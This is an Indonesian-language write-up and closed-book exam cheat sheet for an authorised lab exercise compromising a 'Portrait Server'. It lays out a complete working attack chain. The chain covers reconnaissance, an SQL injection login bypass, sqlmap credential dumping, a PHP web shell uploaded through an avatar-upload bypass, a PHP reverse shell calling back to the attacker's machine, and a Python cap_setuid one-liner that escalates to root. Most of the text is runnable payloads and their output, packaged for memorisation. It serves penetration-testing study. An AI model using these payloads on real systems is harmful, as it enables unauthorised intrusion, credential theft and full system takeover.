# Write-Up Privilege Escalation pada Portrait Server

> **Versi Ringkas untuk Ujian Closed Book**
>
> **Ruang lingkup:** materi ini hanya untuk lingkungan laboratorium yang telah memperoleh izin pengujian.

---

## 📋 Ringkasan Satu Paragraf

Target web server `192.168.56.118:8080` memiliki kerentanan **SQL Injection** pada halaman login yang memungkinkan ekstraksi kredensial administrator. Setelah login, fitur upload avatar dapat dilewati untuk mengunggah web shell PHP. Web shell kemudian digunakan untuk enumerasi sistem dan menemukan bahwa Python memiliki capability `cap_setuid=ep`, yang memungkinkan privilege escalation dari user `www-data` menjadi `root`.

---

## 🎯 Lima Fase Serangan: R-E-U-P-R

| Fase | Nama | Aksi Utama | Output |
|---:|---|---|---|
| **1** | **R**econnaissance | Nmap dan Dirsearch | Menemukan port `8080`, `/administrator`, dan `/uploads` |
| **2** | **E**xploit SQLi | SQL Injection pada login | Mendapatkan kredensial administrator |
| **3** | **U**pload Bypass | Mengunggah web shell PHP | Command execution sebagai `www-data` |
| **4** | **P**ost-Enumeration | Menjalankan `getcap -r /` | Menemukan `python3.13 cap_setuid=ep` |
| **5** | **R**oot | Menjalankan payload Python | Privilege escalation menjadi `root` |

> **Mnemonic:** **R-E-U-P-R** = **R**econ, **E**xploit SQL, **U**pload, **P**ost-Enumeration, **R**oot.

---

# 🔍 Fase 1 — Reconnaissance

## Step 1.1 — Nmap Scan

```bash
nmap -Pn -sC -sV 192.168.56.118
```

Hasil yang perlu diingat:

```text
Port 8080 terbuka
Service HTTP menggunakan Apache
```

## Step 1.2 — Directory Enumeration

```bash
dirsearch \
  -u http://192.168.56.118:8080 \
  -e php
```

Hasil penting:

```text
/administrator  → halaman login
/uploads        → direktori upload file
/profile        → halaman profil yang membutuhkan login
```

## Step 1.3 — Memeriksa Halaman Login

```text
http://192.168.56.118:8080/administrator
```

Form login memiliki parameter:

```text
username
password
```

---

# 💉 Fase 2 — SQL Injection

## Step 2.1 — Login Bypass Manual

Payload utama:

```sql
' OR '1'='1
```

Contoh request:

```http
POST /administrator HTTP/1.1
Host: 192.168.56.118:8080
Content-Type: application/x-www-form-urlencoded

username=' OR '1'='1&password=' OR '1'='1
```

### Mengapa Berhasil?

Ekspresi berikut selalu bernilai benar:

```sql
'1'='1'
```

Secara sederhana, query autentikasi dapat berubah menjadi kondisi yang selalu benar:

```sql
SELECT *
FROM users
WHERE TRUE
  AND TRUE;
```

Hasil:

```text
Bypass autentikasi → masuk sebagai administrator
```

## Step 2.2 — Ekstraksi Kredensial dengan SQLMap

### Menemukan Database Aktif

```bash
sqlmap \
  -u 'http://192.168.56.118:8080/administrator' \
  --data='username=admin&password=test' \
  -p username \
  --batch \
  --current-db
```

Hasil:

```text
portrait
```

### Menemukan Tabel

```bash
sqlmap \
  -u 'http://192.168.56.118:8080/administrator' \
  --data='username=admin&password=test' \
  -p username \
  --batch \
  -D portrait \
  --tables
```

Hasil penting:

```text
users
```

### Mengekstrak Data User

```bash
sqlmap \
  -u 'http://192.168.56.118:8080/administrator' \
  --data='username=admin&password=test' \
  -p username \
  --batch \
  -D portrait \
  -T users \
  --dump
```

Hasil:

```text
username: admin
password: AdminPortr417126
```

### Mnemonic SQLMap

```text
D-T-D = Database, Tables, Dump
```

| Tahap | Opsi | Fungsi |
|---|---|---|
| Database | `--current-db` | Menemukan database aktif |
| Tables | `--tables` | Menemukan tabel |
| Dump | `--dump` | Mengambil isi tabel |

---

# 📤 Fase 3 — File Upload Bypass

## Step 3.1 — Login sebagai Administrator

Buka:

```text
http://192.168.56.118:8080/administrator
```

Gunakan:

```text
Username : admin
Password : AdminPortr417126
```

Setelah login, akses:

```text
http://192.168.56.118:8080/profile
```

Pada halaman tersebut tersedia fitur upload avatar.

## Step 3.2 — Membuat Web Shell

Nama file:

```text
cakgup.php
```

Isi:

```php
<?php
system($_GET['cmd']);
?>
```

Versi satu baris:

```php
<?php system($_GET['cmd']); ?>
```

## Step 3.3 — Mengunggah Payload

```bash
curl -X POST \
  http://192.168.56.118:8080/profile \
  -F "avatar=@cakgup.php;filename=cakgup.php;type=image/jpeg" \
  -b "PHPSESSID=<SESSION_COOKIE>"
```

Ganti `<SESSION_COOKIE>` dengan session ID setelah login.

Apabila file `.php` ditolak, gunakan double extension:

```text
cakgup.php.jpg
```

Langkah manual:

1. Pilih file `cakgup.php`.
2. Ubah nama menjadi `cakgup.php.jpg` apabila diperlukan.
3. Submit file.
4. Periksa hasil upload di direktori `/uploads`.

## Step 3.4 — Mengakses Web Shell

```text
http://192.168.56.118:8080/uploads/cakgup.php?cmd=id
```

Atau:

```bash
curl -sG \
  --data-urlencode "cmd=id" \
  http://192.168.56.118:8080/uploads/cakgup.php
```

Hasil:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Kesimpulan:

```text
Command execution berhasil sebagai user www-data.
```

---

# 🔎 Fase 4 — System Enumeration

## Step 4.1 — Perintah Dasar

Definisikan URL web shell:

```bash
BASE_URL="http://192.168.56.118:8080/uploads/cakgup.php"
```

### Memeriksa User

```bash
curl -sG \
  --data-urlencode "cmd=id" \
  "$BASE_URL"
```

Hasil:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Memeriksa Kernel

```bash
curl -sG \
  --data-urlencode "cmd=uname -a" \
  "$BASE_URL"
```

Hasil penting:

```text
Linux 5.15.0-178-generic
```

### Memeriksa Versi Sistem Operasi

```bash
curl -sG \
  --data-urlencode "cmd=cat /etc/os-release" \
  "$BASE_URL"
```

Hasil penting:

```text
Ubuntu 22.04.5 LTS
```

## Step 4.2 — Memeriksa SUID Binary

```bash
curl -sG \
  --data-urlencode \
  "cmd=find / -perm -4000 -type f 2>/dev/null" \
  "$BASE_URL"
```

Contoh hasil:

```text
/usr/bin/passwd
/usr/bin/su
/usr/bin/mount
/usr/bin/umount
```

Pada jalur eksploitasi ini, fokus utama bukan SUID binary, tetapi Linux capability.

## Step 4.3 — Memeriksa Linux Capabilities

```bash
curl -sG \
  --data-urlencode \
  "cmd=getcap -r / 2>/dev/null" \
  "$BASE_URL"
```

Hasil kritis:

```text
/usr/bin/python3.13 cap_setuid=ep
```

### Arti Temuan

Capability:

```text
cap_setuid=ep
```

memungkinkan binary Python mengubah UID proses. Karena Python dapat memanggil `os.setuid(0)`, capability tersebut dapat digunakan untuk menjalankan proses dengan UID `0`.

---

# 👑 Fase 5 — Privilege Escalation ke Root

## Step 5.1 — Menjalankan Payload

Gunakan binary yang memiliki capability secara eksplisit:

```bash
/usr/bin/python3.13 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```

Untuk pembuktian melalui web shell non-interaktif:

```bash
curl -sG \
  --data-urlencode \
  "cmd=/usr/bin/python3.13 -c 'import os; os.setuid(0); os.system(\"id; whoami\")'" \
  http://192.168.56.118:8080/uploads/cakgup.php
```

Payload inti yang perlu diingat:

```bash
/usr/bin/python3.13 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```

> Pada web shell non-interaktif, gunakan `os.system("id; whoami")` untuk pembuktian singkat. Untuk memperoleh shell interaktif, gunakan reverse shell terlebih dahulu.

## Step 5.2 — Verifikasi Root

```bash
id
```

Hasil yang diharapkan:

```text
uid=0(root) gid=33(www-data) groups=33(www-data)
```

Kemudian:

```bash
whoami
```

Hasil:

```text
root
```

Privilege escalation berhasil.

---

# 🔄 Opsi Alternatif — Reverse Shell

## Step 1 — Menjalankan Listener di Kali Linux

```bash
nc -lvnp 1234
```

## Step 2 — Membuat Reverse Shell PHP

Nama file:

```text
shell.php
```

Isi:

```php
<?php
$sock = fsockopen("192.168.56.5", 1234);

proc_open(
    "/bin/sh -i",
    array(
        0 => $sock,
        1 => $sock,
        2 => $sock
    ),
    $pipes
);
?>
```

Sesuaikan IP `192.168.56.5` dengan alamat IP Kali Linux.

## Step 3 — Mengakses File

```text
http://192.168.56.118:8080/uploads/shell.php
```

## Step 4 — Eskalasi dari Reverse Shell

```bash
/usr/bin/python3.13 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```

Verifikasi:

```bash
id
whoami
```

Hasil yang diharapkan:

```text
uid=0(root)
root
```

---

# 📝 Cheat Sheet Hafalan

## Lima Perintah Wajib

| No. | Perintah | Fungsi |
|---:|---|---|
| 1 | `nmap -Pn -sC -sV 192.168.56.118` | Memindai port dan service |
| 2 | `dirsearch -u http://192.168.56.118:8080 -e php` | Menemukan direktori dan endpoint |
| 3 | `sqlmap -u URL --data="..." -p username --batch -D portrait -T users --dump` | Mengekstrak data database |
| 4 | `getcap -r / 2>/dev/null` | Memeriksa Linux capability |
| 5 | `/usr/bin/python3.13 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh")'` | Eskalasi ke root |

## Tiga Kerentanan Kunci

| No. | Kerentanan | Lokasi | Dampak |
|---:|---|---|---|
| 1 | SQL Injection | `/administrator` | Bypass login dan ekstraksi kredensial |
| 2 | Unrestricted File Upload | `/profile` | Upload dan eksekusi web shell |
| 3 | Python `cap_setuid` | `/usr/bin/python3.13` | Privilege escalation menjadi root |

## Hasil Penting yang Harus Diingat

```text
Target      : 192.168.56.118:8080
Database    : portrait
Tabel       : users
Kredensial  : admin / AdminPortr417126
User awal   : www-data (uid=33)
Capability  : /usr/bin/python3.13 cap_setuid=ep
User akhir  : root (uid=0)
```

---

# 🧠 Tips Menghafal

## 1. Metode R-E-U-P-R

```text
R = Run Scan
E = Exploit SQL
U = Upload Shell
P = Python Capability
R = Root
```

## 2. Tiga Angka Penting

```text
Port HTTP    : 8080
UID www-data : 33
UID root     : 0
```

## 3. Tiga Path atau File Penting

```text
/administrator  → halaman login
/uploads/       → direktori upload
cakgup.php      → web shell
```

## 4. Dua Perintah Utama

Mencari capability:

```bash
getcap -r / 2>/dev/null
```

Privilege escalation:

```bash
/usr/bin/python3.13 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```

## 5. Mnemonic SQLMap

```text
D-T-D = Database, Tables, Dump
```

```text
--current-db → mencari database
--tables     → mencari tabel
--dump       → mengambil data
```

---

# ⚡ Alur Singkat 30 Detik

```text
1. Scan:
   nmap → port 8080

2. Enumerasi:
   dirsearch → /administrator

3. Bypass:
   ' OR '1'='1 → login

4. SQLMap:
   D-T-D → admin / AdminPortr417126

5. Upload:
   cakgup.php → /uploads/

6. Verifikasi:
   cakgup.php?cmd=id → www-data

7. Enumerasi:
   getcap -r / → python3.13 cap_setuid=ep

8. Root:
   python3.13 + os.setuid(0)

9. Bukti:
   id → uid=0(root)
```

---

# ✅ Checklist Ujian

- [ ] Nmap menemukan port `8080`.
- [ ] Dirsearch menemukan `/administrator`.
- [ ] SQL Injection berhasil melewati login.
- [ ] SQLMap mengekstrak kredensial administrator.
- [ ] File `cakgup.php` berhasil diunggah.
- [ ] Web shell berjalan sebagai `www-data`.
- [ ] `getcap` menemukan `/usr/bin/python3.13 cap_setuid=ep`.
- [ ] Payload Python memberikan privilege root.
- [ ] Perintah `id` menunjukkan `uid=0(root)`.

---

# 🎯 Kesimpulan

Attack chain pada Portrait Server dapat diingat menggunakan mnemonic:

```text
R-E-U-P-R
Reconnaissance
→ Exploit SQL Injection
→ Upload Web Shell
→ Post-Enumeration
→ Root
```

Tiga kerentanan utama yang membentuk attack chain adalah:

```text
SQL Injection
→ Unrestricted File Upload
→ Python cap_setuid Misconfiguration
```

Hasil akhir:

```text
www-data (uid=33)
→ /usr/bin/python3.13 cap_setuid=ep
→ root (uid=0)
```

> **Tetap tenang saat ujian dan ingat: R-E-U-P-R.**
